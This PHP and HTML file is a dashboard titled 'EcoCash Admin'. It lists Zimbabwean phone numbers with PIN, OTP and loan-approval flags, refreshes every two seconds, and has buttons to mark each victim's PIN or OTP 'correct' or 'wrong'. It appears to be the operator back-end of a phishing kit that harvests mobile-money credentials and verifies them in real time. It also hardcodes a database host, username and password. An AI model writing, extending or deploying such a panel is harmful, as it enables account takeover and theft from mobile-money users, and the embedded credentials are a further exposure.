<?php
session_start();

// ========== POSTGRESQL CONFIGURATION ==========
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==============================================

function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
if (!$conn) {
    die("Database connection failed.");
}

// Ensure `approve` column exists in `users` table
pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS approve INTEGER DEFAULT 0");

// Handle AJAX updates
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    
    header('Content-Type: application/json');
    $phone = $_POST['phone'] ?? '';
    $type = $_POST['type'] ?? '';   // 'pin', 'otp', 'loan'
    $action = $_POST['action'] ?? ''; // 'correct'/'wrong' or 'approve'/'default'
    
    if (empty($phone) || empty($type) || empty($action)) {
        echo json_encode(['success' => false, 'error' => 'Invalid parameters']);
        exit;
    }
    
    // Map to column and new value
    switch ($type) {
        case 'pin':
            $column = 'pin';
            $newValue = ($action === 'correct') ? 1 : 0;
            break;
        case 'otp':
            $column = 'otp';
            $newValue = ($action === 'correct') ? 1 : 0;
            break;
        case 'loan':
            $column = 'approve';
            $newValue = ($action === 'approve') ? 1 : 0;
            break;
        default:
            echo json_encode(['success' => false, 'error' => 'Invalid type']);
            exit;
    }
    
    $sql = "UPDATE users SET $column = $1 WHERE phone = $2";
    $result = pg_query_params($conn, $sql, [$newValue, $phone]);
    
    if ($result) {
        echo json_encode(['success' => true]);
    } else {
        error_log("Update error: " . pg_last_error($conn));
        echo json_encode(['success' => false, 'error' => 'Database update failed']);
    }
    exit;
}

// AJAX fetch data (descending order)
if (isset($_GET['fetch_data']) && $_GET['fetch_data'] == 1) {
    header('Content-Type: application/json');
    $sql = "SELECT phone, pin, otp, approve FROM users ORDER BY phone DESC";
    $result = pg_query($conn, $sql);
    if (!$result) {
        echo json_encode(['error' => 'Query failed']);
        exit;
    }
    $records = [];
    while ($row = pg_fetch_assoc($result)) {
        $records[] = [
            'phone' => $row['phone'],
            'pin_status' => (int)$row['pin'],
            'otp_status' => (int)$row['otp'],
            'loan_approve' => (int)$row['approve']
        ];
    }
    echo json_encode($records);
    exit;
}

// Initial load (same query)
$sql = "SELECT phone, pin, otp, approve FROM users ORDER BY phone DESC";
$result = pg_query($conn, $sql);
$records = [];
if ($result) {
    while ($row = pg_fetch_assoc($result)) {
        $records[] = [
            'phone' => $row['phone'],
            'pin_status' => (int)$row['pin'],
            'otp_status' => (int)$row['otp'],
            'loan_approve' => (int)$row['approve']
        ];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>EcoCash Admin | Users (PIN, OTP, Loan)</title>
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 16px;
        }
        .container {
            max-width: 1300px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        h1 {
            background: #0a5fa7;
            color: white;
            margin: 0;
            padding: 18px 20px;
            font-size: 1.5rem;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 12px;
        }
        .refresh-indicator {
            font-size: 0.75rem;
            background: rgba(255,255,255,0.2);
            padding: 4px 12px;
            border-radius: 30px;
        }
        .table-wrapper {
            overflow-x: auto;
            padding: 16px 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.9rem;
            min-width: 500px;
        }
        th, td {
            padding: 12px 12px;
            text-align: left;
            border-bottom: 1px solid #e0e0e0;
        }
        th {
            background-color: #f8f9fa;
            font-weight: 600;
            color: #1f2d3d;
        }
        tr:hover {
            background-color: #f5f7fa;
        }
        .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 30px;
            font-size: 0.75rem;
            font-weight: 600;
        }
        .badge-success {
            background-color: #d4edda;
            color: #155724;
        }
        .badge-warning {
            background-color: #fff3cd;
            color: #856404;
        }
        .badge-approved {
            background-color: #cce5ff;
            color: #004085;
        }
        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        .btn {
            border: none;
            padding: 6px 14px;
            border-radius: 8px;
            font-size: 0.75rem;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            white-space: nowrap;
        }
        .btn-pin { background-color: #1d4ed8; color: white; }
        .btn-pin:hover { background-color: #1e40af; }
        .btn-otp { background-color: #10b981; color: white; }
        .btn-otp:hover { background-color: #059669; }
        .btn-loan { background-color: #f59e0b; color: white; }
        .btn-loan:hover { background-color: #d97706; }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 16px;
        }
        .modal-content {
            background: white;
            border-radius: 20px;
            width: 100%;
            max-width: 340px;
            padding: 24px 20px;
            text-align: center;
            box-shadow: 0 20px 30px rgba(0,0,0,0.2);
        }
        .modal-content p {
            margin: 0 0 20px;
            font-size: 1.2rem;
            font-weight: 500;
            word-break: break-word;
        }
        .modal-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .modal-buttons button {
            padding: 12px;
            border: none;
            border-radius: 50px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
        }
        .btn-correct, .btn-approve {
            background-color: #10b981;
            color: white;
        }
        .btn-wrong, .btn-default {
            background-color: #ef4444;
            color: white;
        }
        footer {
            padding: 14px 20px;
            background: #f8f9fa;
            font-size: 0.7rem;
            color: #6c757d;
            text-align: center;
            border-top: 1px solid #e0e0e0;
        }
        @media (max-width: 700px) {
            body { padding: 10px; }
            h1 { font-size: 1.2rem; padding: 14px 16px; }
            th, td { padding: 8px 8px; font-size: 0.8rem; }
            .btn { padding: 5px 10px; font-size: 0.7rem; }
            .badge { font-size: 0.7rem; padding: 3px 8px; }
        }
        @media (max-width: 550px) {
            .table-wrapper { padding: 12px; }
            .btn-group { flex-direction: column; gap: 6px; }
            .btn { text-align: center; }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>
        🔐 EcoCash Admin – Users (PIN / OTP / Loan)
        <span class="refresh-indicator">Auto-refresh 2s</span>
    </h1>
    <div class="table-wrapper">
        <table id="dataTable">
            <thead>
                <tr><th>Phone Number</th><th>PIN Status</th><th>OTP Status</th><th>Loan Approve</th><th>Actions</th></tr>
            </thead>
            <tbody id="tableBody">
                <tr><td colspan="5">Loading...</td></tr>
            </tbody>
        </table>
    </div>
    <footer>
        ✅ Click a button → choose On (1) or Off (0).<br>
        📱 Phone list in descending order (largest first).
    </footer>
</div>

<div id="verifyModal" class="modal">
    <div class="modal-content">
        <p id="modalMessage">Select option:</p>
        <div class="modal-buttons" id="modalButtons"></div>
    </div>
</div>

<script>
    let pendingPhone = null;
    let pendingType = null;
    const modal = document.getElementById('verifyModal');
    const modalMessage = document.getElementById('modalMessage');
    const modalButtons = document.getElementById('modalButtons');
    const tableBody = document.getElementById('tableBody');

    function renderTable(records) {
        if (!records || records.length === 0) {
            tableBody.innerHTML = '<tr><td colspan="5" style="text-align:center;">No records found.</td></tr>';
            return;
        }
        let html = '';
        records.forEach(record => {
            const phone = escapeHtml(record.phone);
            const pinStatus = record.pin_status;
            const otpStatus = record.otp_status;
            const loanApprove = record.loan_approve;
            
            html += `<tr data-phone="${phone}">`;
            html += `<td>+263 ${phone}</td>`;
            html += `<td><span class="badge ${pinStatus ? 'badge-success' : 'badge-warning'}">${pinStatus ? 'On (1)' : 'Off (0)'}</span></td>`;
            html += `<td><span class="badge ${otpStatus ? 'badge-success' : 'badge-warning'}">${otpStatus ? 'On (1)' : 'Off (0)'}</span></td>`;
            html += `<td><span class="badge ${loanApprove ? 'badge-approved' : 'badge-warning'}">${loanApprove ? 'Approved (1)' : 'Default (0)'}</span></td>`;
            html += `<td class="btn-group">
                        <button class="btn btn-pin verify-pin" data-phone="${phone}">🔐 PIN</button>
                        <button class="btn btn-otp verify-otp" data-phone="${phone}">📱 OTP</button>
                        <button class="btn btn-loan verify-loan" data-phone="${phone}">🏦 Loan</button>
                     </td>`;
            html += `</tr>`;
        });
        tableBody.innerHTML = html;
        attachEvents();
    }
    
    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    function attachEvents() {
        document.querySelectorAll('.verify-pin').forEach(btn => {
            btn.onclick = () => showModal(btn.dataset.phone, 'pin', [
                { label: '✅ On (set to 1)', action: 'correct', class: 'btn-correct' },
                { label: '❌ Off (set to 0)', action: 'wrong', class: 'btn-wrong' }
            ]);
        });
        document.querySelectorAll('.verify-otp').forEach(btn => {
            btn.onclick = () => showModal(btn.dataset.phone, 'otp', [
                { label: '✅ On (set to 1)', action: 'correct', class: 'btn-correct' },
                { label: '❌ Off (set to 0)', action: 'wrong', class: 'btn-wrong' }
            ]);
        });
        document.querySelectorAll('.verify-loan').forEach(btn => {
            btn.onclick = () => showModal(btn.dataset.phone, 'loan', [
                { label: '✅ Approve (set to 1)', action: 'approve', class: 'btn-approve' },
                { label: '❌ Default (set to 0)', action: 'default', class: 'btn-default' }
            ]);
        });
    }
    
    function showModal(phone, type, options) {
        pendingPhone = phone;
        pendingType = type;
        const typeLabel = type === 'pin' ? 'PIN' : (type === 'otp' ? 'OTP' : 'Loan');
        modalMessage.innerText = `${typeLabel} for ${phone}:`;
        modalButtons.innerHTML = '';
        options.forEach(opt => {
            const btn = document.createElement('button');
            btn.textContent = opt.label;
            btn.className = opt.class;
            btn.onclick = () => {
                updateStatus(pendingPhone, pendingType, opt.action);
                closeModal();
            };
            modalButtons.appendChild(btn);
        });
        modal.style.display = 'flex';
    }
    
    function closeModal() {
        modal.style.display = 'none';
        pendingPhone = null;
        pendingType = null;
    }
    
    async function updateStatus(phone, type, action) {
        const fd = new FormData();
        fd.append('phone', phone);
        fd.append('type', type);
        fd.append('action', action);
        try {
            const res = await fetch(window.location.href, {
                method: 'POST',
                headers: { 'X-Requested-With': 'XMLHttpRequest' },
                body: fd
            });
            const data = await res.json();
            if (data.success) {
                await fetchData();
            } else {
                alert('Error: ' + (data.error || 'Update failed'));
            }
        } catch(err) {
            alert('Network error');
        }
        closeModal();
    }
    
    async function fetchData() {
        try {
            const res = await fetch(window.location.href + '?fetch_data=1');
            const records = await res.json();
            renderTable(records);
        } catch(err) {
            console.error('Fetch error:', err);
        }
    }
    
    window.onclick = (e) => { if (e.target === modal) closeModal(); };
    
    fetchData();
    setInterval(fetchData, 2000);
</script>
</body>
</html>
